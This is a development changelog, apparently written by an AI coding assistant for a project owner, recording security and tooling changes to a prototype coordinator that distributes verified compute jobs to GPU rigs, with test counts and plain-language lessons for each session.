- Tests went from 168 to 177, all passing. I switched off seven parts one at a time (the new diary entry, the revoked-rig exception, the "don't count a timeout twice" check, judging on the latest pick, keeping the entry private, the health warning, counting only audit jobs) and a test failed every time. I also ran it for real: started the coordinator, enrolled a rig with an invite code, and its trust report showed all zeros, the health page showed no dropouts and no warnings, and the report was refused (403) without the operator password. Still software only: no real GPU yet.

**What you learned**
1. **Two ways to game a lottery.** You can try to win more draws (fixed earlier by picking at random) or throw away the tickets you don't like. Random picks fix the first; counting what each rig throws away makes the second visible.
2. **Count first, decide later.** A number with no automatic consequence is safe to add today. Deciding what it should *do* (more checks? a warning to the owner?) is a fairness question, so it waits for you.
3. **Same symptom, different causes.** A rig with a flaky Wi-Fi connection and a rig dodging checks both "drop" audits. Good monitoring says what it saw, not what it thinks it means.
4. **Avoid double counting.** One event (a timeout) can show up in two places in the diary. Each drop is counted from exactly one kind of entry, and a test checks that.

## 2026-11-22 (15:15 UTC): One list of held results that need a person

**Shipped**
- **An operator review queue** (`GET /v1/operator/review`, or `python -m app.review` on the coordinator machine). When a result's points are "held", the software has spotted a problem. Some of those it can settle itself (a third rig breaks the tie), but some it can't. Until now those just sat there and you'd have had to dig through the audit list and the diary to find them. Now there is one list, and each held case has a **stage**:
  - **needs_review:** nothing in the software will settle it. Three kinds: a disagreement whose tie-breaker never ran (often because only two rigs were online) or was never scheduled; three runs with three different answers; and a rig that failed a hidden test job.
  - **waiting:** a tie-breaker is queued or running. Check back later.
  - **decided_by_majority:** two answers agreed against one. Listed so you can spot-check, because two rigs working together can outvote an honest one.
- **Every answer side by side.** Each case shows the input, every rig's answer (and the expected answer for a hidden test), the rig, its owner label and strike count, **which answers agree** using the same rule the audits use (spacing differences don't count), how many points are held and for how long. `--all` adds the waiting and majority cases; `--json` prints everything.
- **The health page nudges you.** `/v1/operator/health` now has `review` counts and a warning like "1 held case(s) need a person" whenever something is stuck.
- **It only looks.** Nothing in the queue changes a status, a point or the diary, and there is no "override" button. What your verdict on a case should do to its points is part of scoring v2, which is still your decision (added to your to-do list). It shows answers and hidden tests' expected answers, so it needs the operator password and is never written to the logs.
- Tests went from 177 to 190, all passing. I switched off nine parts one at a time (the "waiting" stage, using the task's tolerance rule, counting only held points, sorting the stuck cases first, the health warning, the operator password, the "needs a person only" filter, three-way disagreements needing a person, strike counts) and a test failed every time. I also ran it for real: started the coordinator, enrolled two rigs with invite codes, had them disagree on an AI job (with a fake pinned model file, since there's no GPU or llama.cpp here) and had one fail a hidden test. The queue was refused (403) without the password; with it, it showed the failed test as `needs_review` and the disagreement as `waiting` (no third rig for the tie-breaker), 3 points held; the health page warned; the public ledger and the server log contained none of the answers. Still software only: no real GPU yet.

**What you learned**
1. **Automation should know when to stop.** A good checking system settles the easy cases itself and hands the rest to a person with everything they need on one screen, instead of guessing.
2. **"Held" isn't one thing.** Waiting for a tie-breaker, stuck with no tie-breaker, and outvoted all look like "held" in the public ledger, but only some of them need you. The stage tells them apart.
3. **A failed hidden test isn't automatically cheating.** The rig might have the wrong model file, or real GPUs might give slightly different answers (we won't know until the RX 470s run). That's why it goes to a person instead of straight to a penalty.
4. **Look first, decide the rules later.** Seeing real stuck cases side by side is the best way to decide what a reviewer's verdict should do to points (scoring v2).

## 2026-11-22 (16:20 UTC): Only you (or a program you trust) can queue jobs, and nobody can flood or guess their way in

**Shipped**
- **Closed a points loophole.** Until now, *anyone* who could reach the coordinator could add a job with `POST /v1/jobs`, including a rig. A rig could add a job worth 1000 simulated points while the queue was empty, pick it up itself and get paid. Now adding a job needs a password-like token: either your operator token, or a new **submitter token** (`SUBMITTER_TOKEN` in `.env`). The submitter token can do exactly one thing, add normal jobs. It can't see hidden tests, answers, audits or reward reports, and can't sign up rigs, so a program that feeds in work never needs your operator token. A rig's own key doesn't work there at all.
- **A speed limit per address.** Each address that talks to the coordinator gets 240 requests a minute by default (`RATE_LIMIT_PER_MINUTE`). Go over and the reply is `429 Too Many Requests` with a `Retry-After` saying how many seconds to wait. The demo worker now waits as told (never more than 60 s at a time, a few times) and then carries on.
- **A lock-out for guessers.** If one address sends 10 wrong keys, tokens or invite codes within 10 minutes (`AUTH_FAILURE_LIMIT`, `AUTH_FAILURE_WINDOW_SECONDS`), it's refused everywhere until the oldest mistake is 10 minutes old. Forgetting to send a key at all doesn't count, because that's a setup mistake, not a guess.
- **`/health` always answers**, so a monitoring service can't be locked out by someone else's traffic.
- **Addresses stay out of the logs.** Log lines about limits carry a short `client_tag` (a scrambled stand-in that's the same for one address until the next restart), never the address. Your operator health page shows the real address of anyone locked out, with a warning, so you can block it in a firewall if you want.
- Tests went from 190 to 210, all passing. I switched off 13 rules one at a time (the token check, counting each kind of wrong password, not counting missing ones, the `/health` exception, the lock-out, the speed limit, the refill cap, forgetting old mistakes, hiding the address in logs, the health warning, a submitter header sent when no submitter token is set) and a test failed every time. The first round found two rules that no test covered, so I added tests for them. I also ran it for real: no token got `403`, the submitter token got `200` (and `403` on an operator page), a demo rig finished the job, the rig's own 1000-point job was refused, three wrong passwords locked the address out (`429`, wait 600 s) while `/health` still answered, and the operator health page, opened from a second address, named it. A second run at 5 requests a minute refused the 6th with "wait 12 s". Still software only: no real GPU yet.

**What you learned**
1. **Ask "who is allowed to do this?" for every button.** The job queue checked rigs carefully but let anyone add jobs, and adding a job decided how many points it paid. A small open door next to a locked one is still an open door.
2. **Give each program the smallest key that does its job.** Your operator token opens everything, including hidden tests' answers. A separate "add jobs only" token means a leaked job-feeder doesn't leak your tests.
3. **A speed limit is a bucket.** Each address starts with 240 tokens, every request spends one, and tokens drip back in at 4 per second. That allows short bursts but not a steady flood.
4. **Lock-outs have a cost.** Everyone behind your home router looks like one address to the coordinator, so one rig with a wrong key could lock your other rig out for 10 minutes. That's why the limit is generous, missing keys don't count, and a restart clears it.

## 2026-11-22 (17:15 UTC): Limits hit the right rig when the coordinator sits behind a proxy

**Shipped**
- **A new setting, `TRUSTED_PROXIES`.** Last session added a speed limit and a lock-out per address. But if you ever put the coordinator behind a "front door" program (nginx, Caddy, a tunnel, a load balancer), every request looks like it came from that front door. All your rigs would share one speed limit, and one rig with a wrong key would lock **all** of them out for 10 minutes. Front doors pass on the real address in a note called `X-Forwarded-For`. Now, if you list your front door in `TRUSTED_PROXIES` (for example `127.0.0.1` when it runs on the same machine), the coordinator reads that note and limits each real rig separately.
- **Nobody else can fake the note.** It's empty by default, and the note is ignored unless the connection really comes from an address you listed. Even through your front door, the note is read from the right-hand end, where your own front door wrote, so a rig that adds a made-up address on the left gets nothing for it. "Trust everyone" (`0.0.0.0/0`) is refused and the coordinator won't start with it.
- **It tells you when the front door isn't set up right.** If requests come through a listed front door without the note, or with junk in it, the operator health page counts them (`rate_limits.proxies`) and says so in plain words.
- **The real rig is the one that's named.** Lock-outs, the log's scrambled `client_tag` and the health page all use the real address, so you'd block the rig, not your own front door. Addresses still never go in the log.
- **Quick start changed by one flag:** start the coordinator with `--no-proxy-headers`. uvicorn (the program that runs the coordinator) has its own version of this feature, quietly switched on for `127.0.0.1`; turning it off leaves one setting in charge instead of two.
- Tests went from 210 to 230, all passing. I switched off 12 rules one at a time (trusting any address, reading from the right, refusing trust-everyone, counting a missing note, stopping at junk, IPv4 seen over IPv6, port numbers, the 20-step cap, working the address out once per request, the health warning, reading the setting, using it at all) and a test failed every time. I also ran it for real: started the coordinator with `TRUSTED_PROXIES=127.0.0.1`, sent three wrong keys as "rig A" through the pretend front door. Rig A was locked out (`429`), "rig B" through the same front door still got in (`200`), rig A pretending to be rig B was still locked out, the health page named rig A's address and warned about one request with no note, and the log had no addresses in it. Still software only: no real GPU yet.

**What you learned**
1. **A front door hides who's knocking.** Behind a proxy, the coordinator only "sees" the proxy. That's fine for security walls, bad for per-person limits.
2. **Only believe a note from someone you trust.** `X-Forwarded-For` is just text anyone can type. It's only worth reading when it arrives straight from your own front door.
3. **Read the note from the end.** Each front door adds what it saw to the right-hand end. Everything to the left could have been written by the visitor, so you walk back from the right and stop at the first address that isn't yours.
4. **One switch, not two.** When two layers (uvicorn and the coordinator) both try to do the same job, they can quietly disagree. Turning one off makes the behaviour easy to reason about.

## 2026-11-22 (18:20 UTC): Hidden tests you can aim at a particular rig

**Shipped**
- **Aimed hidden tests** (threat model #1 and #8). A hidden test is a job where you already know the right answer; a rig that gets it wrong is caught without knowing it. Until now any hidden test went to whichever rig asked first, so you couldn't make sure the brand-new rig, or the one you're suspicious of, was the one that got it. Now `POST /v1/challenges` takes one optional setting:
  - **`target_worker`**: only that rig can take the test, until the test's own deadline, even if it's offline for a while. Nobody else can grab it.
  - **`target_tier`**: `new`, `suspect` or `established` (the trust tiers from 0.5.15). The test goes to a random *active* rig in that tier, worked out when it's handed out. If that rig doesn't pick it up in time, another rig in the same tier gets it. If no rig is in that tier yet, it waits, and the health page tells you.
  - Neither: the old first-come behaviour. Both: refused. An unknown rig gets `404`, a revoked one `409`.
- **The rig still can't tell.** Same job envelope, nothing about the target in it, in the public job view or in the logs. Who was picked is recorded privately, under its own names, so a dodged test doesn't muddle the audit follow-through counts from 0.5.17.
- **Operator view and health page.** `/v1/audits` shows each test's target. `/v1/operator/health` adds `aimed_tests` (open, waiting for a rig) and a warning like "1 aimed hidden test(s) waiting for a rig".
- **Shared ledger copies don't show the aim.** Which tier a rig was in is your private information, so copies drop the target. Copies made with the previous version still check cleanly.
- **Two new self-checks** catch an aimed test taken by the wrong rig (e.g. someone editing the database).
- **It only changes who gets checked, never points.** Results of aimed tests count exactly like any other hidden test.
- Tests went from 230 to 245, all passing. I switched off 19 rules one at a time (only the target may take it, keeping a named rig's test until the deadline, filtering by tier, active rigs only, skipping revoked rigs, separate event names, assigning right away, the old-copy guard, both self-checks, refusing targets on normal jobs, the database upgrade, hiding the events, the 409 and 404, the health warning, passing the target through, one target only, dropping it from copies) and a test failed every time. I also ran it for real: started the coordinator, enrolled three rigs, let rig-a pass a warm-up test (so it's `established`), then aimed a test at tier `new`. It went to rig-c, rig-a was turned away (404), rig-c passed it. A test aimed at the revoked rig-b was refused (409); one aimed at tier `suspect` (nobody there) waited and the health page warned. The public job view showed only `job_created`, `job_leased`, `result_accepted`, the ledger self-check was clean and the server log never mentioned a target. Still software only: no real GPU yet.

**What you learned**
1. **Random checks are fair, aimed checks are useful.** Random spot-checks keep everyone honest on average. Aiming lets you look harder exactly where you're unsure: a rig nobody has vouched for yet, or one that was just caught.
2. **A friend's vouching isn't a test.** A new rig could "graduate" just by being re-checked by a friend's rig that gives the same fake answer. A hidden test with a known answer can't be faked that way, so aiming them at new rigs closes that gap (as long as you create the tests).
3. **Hide the aim, not just the test.** If the rig, the logs or a shared copy revealed who a test was aimed at, a cheater could learn "they're watching me" and behave. So the aim stays in your private records only.
4. **Keep numbers meaning one thing.** A dodged test and a dodged audit look alike, but mixing them would change what the audit follow-through numbers mean. Separate names keep each number honest.

## 2026-11-22 (19:15 UTC): Each kind of job pays a fixed number of points

**Shipped**
- **A points table, `POINTS_TABLE`.** Two sessions ago, adding jobs started needing a token. But whoever held the "add jobs" token (the submitter token) still chose how many simulated points each job paid, anywhere from 0 to 1000. A program with that token, or someone who stole it, could add 1000-point jobs for a friend's rig to pick up. Now you can set one fixed number per kind of job in `prototype/.env`, for example `POINTS_TABLE=demo:sha256=1,llm:generate=10`.
- **With a table, nobody picks the number.** Every new job gets the table's points. A request can leave the number out or send the same number; any other number is refused (`422`) and nothing is added. That goes for your operator token too.
- **Hidden tests can't be spotted by their points.** Hidden tests follow the same table, so a test always pays exactly what normal work of its kind pays. If they paid differently, a cheater could tell "this one's a test" just from the number.
- **Mistakes stop the coordinator at start-up.** The table has to list every kind of job, once each, with a whole number from 0 to 1000. A typo or a missing kind gives a plain error instead of quietly letting some jobs fall back to "pick your own".
- **Off until you set it.** Without a table everything works as before. Your operator health page now shows which rule is on (`points.rule`) and warns while a submitter token is set without a table. Changing the numbers needs a restart; jobs already waiting keep the points they were signed with.
- Tests went from 245 to 270, all passing. I switched off 12 rules one at a time (using the table at all, refusing other numbers, hidden tests using the table, the health warning, the start-up coverage check, refusing a missing kind, a duplicate, a number over 1000, an unknown kind, reading the setting, showing it on the health page, normal jobs using the table) and a test failed every time. I also ran it for real: started the coordinator with `demo:sha256=2`. The submitter asking for 1000 points was refused, leaving the number out gave 2, your hidden test asking for 50 was refused, a demo rig finished the job and the public ledger showed 2 points. After a restart with `demo:sha256=5` a new job paid 5 (ledger total 7). A table missing a kind refused to start. The server log contained no tokens or job text. Still software only: no real GPU yet.

**What you learned**
1. **Whoever sets the price controls the payout.** Locking the door (tokens) wasn't enough while the person coming through it could still write their own paycheck. Fixing the price per kind of job closes that.
2. **Hidden tests have to blend in on every detail.** Same envelope, same deadline, and now the same points. Any one difference can give them away.
3. **Fail loudly at start-up.** A setting with a typo is better refusing to start than silently doing something you didn't mean.
4. **The table decides who picks, not what's fair.** 1 vs 10 points is a guess for now. Once the RX 470s are measured, points could follow real work, like words generated or GPU seconds. Picking the numbers is your call (on your to-do list).

## 2026-11-22 (20:30 UTC): A rig caught cheating no longer has to check other rigs' work

**Shipped**
- **A choice of who checks whom, `AUDITOR_PICK`.** When a result gets a hidden re-run (an audit) or a third opinion (a tie-breaker), the coordinator picks a rig at random. Until now every eligible rig had the same chance, including a rig that had just failed a hidden test. That meant a caught cheater could still "confirm" someone else's fake answer, or be the deciding vote in a two-against-one.
- **`trusted-first`: best record goes first.** With `AUDITOR_PICK=trusted-first` in `prototype/.env`, the pick is still random, but only among the most trusted group that has anyone available: `established` rigs (clean record), then `new` rigs, and a rig with a strike only if nobody else can do it (a check by a doubtful rig still beats no check). Same-owner, switched-off and offline rigs stay excluded as before, and hidden tests you aim at a rig work exactly as before.
- **Off until you choose.** The default stays `uniform` (today's behaviour). Checking work pays the same points as normal work, so `trusted-first` gives established rigs a bigger share of those points. That's a fairness call, so it's on your to-do list. While it's off and some rig has a strike, your operator health page now says that rig can still check others.
- **You can see what happened.** `/v1/audits` shows the rule in force, operator health shows `auditor_pick`, and each private "auditor picked" record now notes which group it came from (`pool=established`). Shared ledger copies still drop those notes. A typo in the setting stops the coordinator at start-up.
- Tests went from 270 to 281, all passing. I switched off 9 rules one at a time (the trusted-first filter, the group order twice, the health warning, reading the setting, refusing bad values, passing the setting through, showing it on `/v1/audits`, the pool note) and a test failed every time. I also started the real server with `trusted-first`: health and `/v1/audits` showed the rule, a bad value refused to start, and the log had no tokens. Still software only: no real GPU yet.

**What you learned**
1. **Who checks matters as much as how often.** Checking a caught rig more often (two days ago) was half the fix. Letting it check others was the other half of the hole.
2. **Every security choice moves money, even pretend money.** Steering checks to trusted rigs also steers the points those checks pay. That's why it's a switch you flip, not something I turned on for you.
3. **Fall back, don't freeze.** If only a doubtful rig is around, using it is better than leaving a result unchecked. The rule picks the best available, never "nobody".
4. **Trust can be gamed too.** A ring that has already earned a clean record gets more checks under this rule, not fewer. Hidden tests with known answers are still the only check a ring can't vote its way past.

## 2026-11-22 (21:45 UTC): A stolen signing key can no longer take over your rigs

**Shipped**
- **The hole.** Every job is signed with the coordinator's private key, and rigs remember ("pin") the matching public key. Since 0.5.16 you can swap that key with a signed "handover note" (old key → new key, signed by both) and rigs follow it on their own. The catch: anyone who *copies* the key file can write that same kind of note, to a key of their own, and every rig would follow them.
- **The fix: a second key that lives in a drawer.** `python -m app.key_rotation make-handover-key --out /media/usb/bnh-handover.key` makes a key whose only job is to sign handover notes. It's meant to sit on a USB stick, never on the coordinator machine. (It refuses to be saved next to the signing key, and never overwrites a file.)
- **Rigs learn it and remember it.** You put the printed public half in `prototype/.env` (`COORDINATOR_HANDOVER_PUBLIC_KEY=...`). The coordinator then announces it, with a signature from its current key so nobody in the middle can swap it. A rig that already trusts the coordinator checks that signature and pins the stick's key next to its other pin. A tampered announcement is ignored, and a pinned key is never swapped automatically.
- **From then on, a handover needs three signatures:** old key, new key, and the stick. A thief with a copy of the key file has the first two, not the third, so pinned rigs refuse and stop. Changing the key yourself is `rotate --handover-key-file <stick>`; once the setting is on, `rotate` refuses to run without the stick, because your rigs would refuse the note.
- **Off until you make the key.** Nothing changes for you or the rigs until you set it up (on your to-do list). Operator health shows which handover key is in force.
- Tests went from 281 to 294, all passing. I switched off 21 rules one at a time (the third-signature check, every check on the announcement, `rotate` needing the right stick, the key-making safety checks, the worker pinning and never-replacing rules, reading the setting, and more) and a test failed every time. I also ran it for real with the server and `demo_worker.py`: the rig pinned the stick's key after a restart; `rotate` without the stick was refused, with it the rig followed and finished a job (1 point); then a fake coordinator built from a copy of the current key file, with a handover to its own key signed by both keys, was refused and the rig's pin didn't move. The server log had no keys or tokens. Still software only: no real GPU yet.

**What you learned**
1. **A key that can replace itself is only as safe as its file.** If the same key both signs jobs and signs "trust my successor", stealing it once means owning the future too.
2. **Split the everyday key from the emergency key.** The signing key has to be online every second. The handover key is needed maybe once a year, so it can be offline, where a hacker on the server can't reach it. Banks and certificate authorities do the same ("root" keys kept offline).
3. **Remembering beats re-asking.** Rigs pin the stick's key once and keep it; a later announcement can't change it. That's why the first contact matters, and why handing rigs both keys in person is still the strongest option.
4. **It narrows the theft, it doesn't undo it.** A thief can still sign jobs until you change the key. The stick lets you change it in a way only you can, which is what ends the theft for every pinned rig.

## 2026-11-22 (22:15 UTC): A tool to read each card's temperature, power and memory

**Shipped**
- **`python -m app.gpu_sensors`.** Phase 3 needs more than "the card shows up": the roadmap asks for temperature, power, VRAM use and stability while a test runs. The amdgpu driver already publishes those numbers as small text files under `/sys/class/drm/cardN/device`. This tool reads them for each card and turns them into plain numbers: °C, watts, MiB used out of total, busy %, current core and memory clock, fan speed, plus the PCI slot so you can match it to the inventory report.
- **One look, or a watch.** With no options it takes one snapshot of every card. With `--card card1 --samples 120 --interval 1 --out gpu1-sensors.json` it reads card1 once a second for two minutes (run it in a second terminal while the test runs on that card), prints a line per reading, and saves the lowest, highest and average of each number. Ctrl-C stops early and keeps what it already read.
- **Plain warnings.** It flags a card that reached 85 °C or came within 5 °C of the driver's own critical limit, VRAM at 90 % or more (the model may not fit reliably), a card not on the `amdgpu` driver, a sensor the driver doesn't expose, and a card that stayed at 0 % busy for the whole watch (meaning your test ran somewhere else).
- **Read-only, like the inventory tool.** It runs no commands, needs no sudo, never writes to those files (no overclocking, fan or power changes), and skips serial numbers. It refuses to overwrite a saved file, and checks that before a long watch starts, not after. Every report says `"proves_inference": false`.
- Tests went from 294 to 341, all passing (47 new, against fake folders laid out like amdgpu's). I switched off 18 rules one at a time (skipping connectors, the read size cap, the power fallback, finding the current clock, the unknown-card warning, the stopped-before-start case, both heat warnings, the VRAM warning, the wrong-driver and non-AMD checks, the idle-card note, keeping readings on Ctrl-C, not sleeping before the first reading, the card filter, the early overwrite check, the card-name check, skipping missing numbers in averages) and a test failed every time. A 19th switch-off (a duplicate error catch) changed nothing because it was redundant, so I removed that line. On this cloud machine, which has no GPU, it correctly reports "No GPU cards found". Still software only: never run on the RX 470s.

**What you learned**
1. **Linux shows hardware as files.** Under `/sys`, the GPU driver publishes live readings as tiny text files (`temp1_input` holds `62000`, meaning 62 °C in thousandths). Reading them is safe; writing some of them changes fan and power settings, which is why this tool only ever reads.
2. **Units hide in the file names.** Temperature is in millidegrees, power in microwatts, memory in bytes. Getting one conversion wrong would make a cool card look like it's on fire, so each one has a test.
3. **Measure while it works, not after.** A card at idle tells you little. The watch mode exists so the numbers cover the actual test, and the "0 % busy" note catches the easy mistake of watching card1 while the job ran on card0.
4. **Numbers about a GPU aren't proof the GPU did the work.** Like the inventory, this tool can't show inference worked. It's the logbook that goes next to a real test run.

## 2026-11-22 (23:20 UTC): A recorder for the first real test on each card

**Shipped**
- **`python -m app.gpu_run`.** The next real step on the rig is a first small test on each card (Track B: "run a minimal smoke test on GPU 0, repeat on GPU 1"). This tool wraps whatever test command you choose and writes down what happened in one JSON file:
  - **Did it work?** Exit code, how long it took, the last 40 lines of its output and error output, and a fingerprint (sha256) of the whole output.
  - **Was the answer right?** Give it the answer you expect (`--expect-file`, compared after ignoring spacing, the same rule as AI jobs; or `--expect-sha256` for an exact match) and it says matched or not. A run that was stopped half-way is never compared.
  - **Exactly what ran?** A fingerprint of the program and of every file named in the command (for example the model file), so someone else can check they're using the same files.
  - **Which card did the work?** It reads every card's busy %, temperature, power and VRAM before, every second during, and after the run. If you said `--card card1` but card0 got busy, it tells you the test most likely ran on card0. If no card got busy, it most likely ran on the CPU.
- **Safety rules.** No shell, no sudo (it refuses `sudo`, `su`, `doas`, `pkexec`, `runuser`), never writes to the driver's files, never overwrites a report (checked before your test starts), stops the test and anything it started after `--timeout` (default 15 minutes) or Ctrl-C. Extra settings passed with `--env` are saved in the report, so names that look like secrets (`TOKEN`, `KEY`, `PASSWORD`...) are refused. Hostname and username are blanked like in the inventory.
- **Honest about what it proves.** Every report says `"proves_inference": false`. One report is a record; it becomes evidence when someone else repeats the same command with the same file fingerprints and gets the same answer.
- Tests went from 341 to 397, all passing (56 new). The "GPU work" in the tests is a small Python program that writes numbers into a fake card folder, so a test can make card0 or card1 look busy. I switched off 20 rules one at a time (stopping the whole process group, refusing secret names in both places, the 10 % busy line, refusing sudo, the early overwrite check, not comparing a stopped run, blanking names, the wrong-card warning, the already-busy warning, trimming the output, the size cap on compared output, hashing files, the exit code, the spacing rule, passing settings through, the VRAM and heat warnings, the timeout itself, upper-case fingerprints) and a test failed every time (for the timeout one, the test hung and was killed). On this cloud machine, which has no GPU, a real run correctly reported "card0 doesn't exist" and refused to overwrite its own report. Still software only: never run on the RX 470s.

**What you learned**
1. **"It ran" and "it ran on the GPU" are different claims.** Programs like llama.cpp quietly fall back to the CPU or pick a different card when the device setting is off. Watching busy % on every card during the run is a cheap way to catch that.
2. **Card numbers aren't always device numbers.** Linux calls them card0/card1; Vulkan numbers its devices separately, and the order can differ. The recorder doesn't guess the mapping, it checks which card actually got busy.
3. **Fingerprint the inputs, not just the output.** A matching answer only means something if you know which program and which model file produced it. Hashing them makes the run repeatable by someone else.
4. **Stop the whole family.** A test program can start helper processes. Stopping only the parent can leave a helper running on the card, so the recorder stops the whole group.

## 2026-11-23 (00:15 UTC): A dress rehearsal for the two-card test

**Shipped**
- **`python -m app.rehearsal`.** Track F (two workers on the two RX 470s) has a checklist: show the coordinator handing work to both workers, show accepted and rejected answers, and try duplicate, malformed, expired and replayed submissions. This tool does that whole checklist from the outside, over the network, the same way real workers talk to the coordinator. It enrolls two workers with one-time codes, hands them tiny jobs one at a time, and tries 28 things, good and bad:
  - **Good:** both workers' honest answers are accepted; the same answer sent twice (a network retry) is accepted as a replay and **paid once**.
  - **Refused by the coordinator:** a changed answer after acceptance, another worker's answer, a job leased to someone else, a broken hash, a missing field, a body that isn't JSON, a "finished before it started" time, an unknown receipt version, no key, a made-up key, a job that doesn't exist, job 3's valid receipt replayed onto job 4, a wrong answer (the job goes back in the queue and the other worker finishes it), answering before claiming, and answering after the deadline.
  - **Refused by the worker itself:** a job someone changed after it was signed, and a job past its deadline.
  - **Afterwards:** the coordinator's own consistency checks are clean, no rehearsal job is left half done, and both rehearsal workers are revoked so their keys are useless.
- **Two ways to run it.** `--local` makes a throwaway coordinator with a temporary database (no setup, about 2 seconds). `--url http://... --allow-writes` runs it against a real coordinator; it refuses without `--allow-writes`, without `OPERATOR_TOKEN` in the environment (never typed on the command line, so it stays out of shell history), and while that coordinator has queued jobs, so the rehearsal workers can't take someone's real work. If a job appears mid-run anyway, it stops without running it. Keys and tokens never go in the report, and it never overwrites a report.
- **Honest about what it proves.** Every report says `"proves_gpu": false` and `"proves_inference": false`. It tests the coordinator's rules with SHA-256 sums done on the CPU. On the rig, it's a quick "are the rules working on this install?" check before the real workers start.
- Tests went from 397 to 409, all passing (12 new). One test runs it against a coordinator that accepts any answer, and the rehearsal correctly flags "wrong answer was accepted". I switched off 9 of the tool's own safety rules one at a time (stopping on someone else's job, the queued-jobs check, never overwriting, waiting when told to slow down, "a run that stopped early never passes", cleaning up the workers, and others) and a test failed every time except one cosmetic one (hiding the coordinator's log lines). I also ran it twice against a real coordinator process on this cloud machine: 28 of 28 both times, about 11 seconds each because the deadline check really waits. Not run on the RX 470 machine yet.

**What you learned**
1. **Test the rules from the outside too.** Each rule already had a unit test inside the code. The rehearsal checks the same rules the way a worker sees them, over the network, on the actual install. That's what catches a wrong setting or an old version on the rig.
2. **A retry is not cheating.** Networks drop replies, so an honest worker may send the same answer twice. The right answer is "accepted, already counted", not an error, and not double points. That's called being *idempotent*.
3. **A replay is a valid message in the wrong place.** Job 3's receipt is genuine, but sending it as the answer to job 4 must fail. The receipt carries job 3's input fingerprint, which is how the coordinator spots it.
4. **Small finding:** two jobs queued in the same second are handed out in random order, not strictly first-come (the tie is broken by the random job id). Harmless today; worth knowing if you ever expect strict order.

## 2026-11-23 (01:20 UTC): One command that says which hardware checks are actually done

**Shipped**
- **`python -m app.phase3_check`.** The rig tools so far each write one report: the inventory (what the machine sees) and one `gpu_run` file per test. Turning those into ticks on the Track B checklist meant reading several JSON files by hand and cross-checking them. This tool does that: give it the inventory and the run files, and it prints the ten Track B items with `[x]` evidenced, `[~]` partly, `[ ]` not yet or `[!]` problem, each with a one-line reason.
- **A smoke test only counts if everything lines up:** the command exited cleanly, its answer matched a known-good answer you supplied, the card it was aimed at got busy and no other card did, that card is on the `amdgpu` driver, and its PCI slot is one the inventory saw (otherwise the file may be from another machine, or the cards were moved).
- **"Repeat on GPU 1" means the same test on a different card.** It compares a fingerprint of the program, the files it used (like the model) and the expected answer, and needs that same fingerprint passing in two different PCI slots. Two runs on one card, or two different tests, don't count.
- **Cards are matched by slot, not by name.** `card0` can become `card1` after a reboot; the slot (`01:00.0`) stays with the physical card.
- **It also flags:** cards that aren't PCI device `1002:67df` (the RX 470's chip; it's shared with the 480/570/580, so it says when only the sticker can tell), Vulkan seeing only a CPU renderer, a render node your user can't open, and lspci, Vulkan and `/dev/dri` disagreeing on how many cards there are.
- **Two items never get a full tick from it:** "stability" and "exact runtime version". It shows peak temperature, power and run time per card, but whether that's stable, and which llama.cpp build you used, are for you to judge and write down.
- **Honest limits.** The report files aren't signed, so this catches mistakes, not a determined faker. A file that says `proves_inference: true` (which the tools never write) is treated as edited. It records each input by file name and sha256, never full paths, and won't overwrite its own output.
- Tests went from 409 to 434, all passing (25 new). The inputs are made by the real inventory code (fed sample `lspci`/`vulkaninfo` text) and the real run recorder (driving fake card folders), so the checker is tested against the actual file formats. I switched off 19 rules one at a time (slot matching, the edited-file check, clean exit, needing an expected answer, wrong answer, wrong driver, card never busy, unknown slot, another card busy, same-test matching, needing a second card, blocked render node, CPU-only Vulkan, wrong PCI driver, non-RX 470 chip, counting copies once, the exit code, keeping sensors at partial) and a test failed every time except one: an early "don't overwrite" check that a later check already covered, so I removed it. On this cloud machine (no GPU) it correctly reports the OS and kernel and "not yet" for everything else. Still software only: no RX 470 output has been checked yet.

**What you learned**
1. **Evidence is a chain, not a single file.** "The test passed on card1" needs the run report *and* the inventory to agree on which physical card that is. One file alone can't show it.
2. **Names move, slots don't.** Linux numbers cards in the order it finds them at boot. The PCI slot is the card's physical address on the motherboard, so it's the safer ID.
3. **"Same test" has to be defined.** Here it means same program, same files and same expected answer. The command line can differ, because pointing the test at card1 instead of card0 often changes a flag.
4. **A checker shouldn't be more confident than its inputs.** Unsigned files can be edited, so the tool calls them consistent, never proven. That's why a second person repeating the run is still the real proof.

## 2026-11-23 (02:30 UTC): An emergency brake, and a plan for when something goes wrong

**Shipped**
- **Emergency pause (`pause-v1`).** One command stops the coordinator handing out work, right away, and it stays stopped even if the server restarts:
  - `POST /v1/operator/pause` with a short reason (operator token), or `python -m app.incident pause --reason "..."` on the server.
  - **Resuming only works on the server:** `python -m app.incident resume --note "what you checked or fixed"`. There's no "resume" over the internet on purpose: if your operator token leaks, a stranger can stop things but can't restart them.
  - **While paused:** no jobs handed out (workers are told "try again in 60 s"), no new jobs or hidden tests (not even yours), no new rigs, no audits assigned. **Still works:** answers for jobs already handed out (so honest work isn't wasted), revoking a rig, and the health pages.
  - **Fair to rigs:** if a rig had been picked to audit something and the pause ran past its time limit, it gets a fresh window afterwards instead of a "didn't show up" mark.
  - The public `/health` page says "paused" (never why); the operator health page shows the reason and a warning. The reason never goes in the logs, and shared ledger copies keep only the fact that a pause happened.
- **Draft incident response plan:** [`docs/INCIDENT-RESPONSE.md`](INCIDENT-RESPONSE.md). The first 15 minutes for any incident, who does what (three blanks for you), and step-by-step playbooks for a leaked worker key, a leaked operator token, a copied signing key, a bug paying wrong points, a hacked GitHub/Netlify/domain/social account, and someone impersonating the project. It only uses commands that exist and were tested. Casino, wallet and chain incidents are explicitly out of scope until those exist.
- Tests went from 434 to 454, all passing (20 new). I switched off 17 of the new rules one at a time and a test failed every time. One test is a "control": the same wait without a pause does count against the rig, which proves the fresh-window rule is what makes the difference. Also run on a real coordinator process here: paused over HTTP, job creation refused with `503`, status and resume from the command line, and the reason didn't appear in the log. Software only, like everything else on the worker side.

**What you learned**
1. **Easy to stop, hard to restart.** Make the safe action (stopping) available from anywhere, and the risky one (restarting) need access to the machine. A stolen password then can only make things quieter.
2. **Pausing beats unplugging.** Killing the server also kills the tools you need during an incident (health page, revoking a rig) and loses honest work in progress. A pause keeps those.
3. **Store the switch where the history is.** The pause is a line in the same audit trail as everything else, so it survives restarts and you can later see exactly when it started and ended.
4. **A pause shouldn't punish bystanders.** Any rule with a timer (here, "pick up your audit within 2 minutes") needs to know the clock stopped, or the pause shows up as someone else's fault.

## 2026-11-23 (03:15 UTC): Catching a rewritten history between two ledger copies

**Shipped**
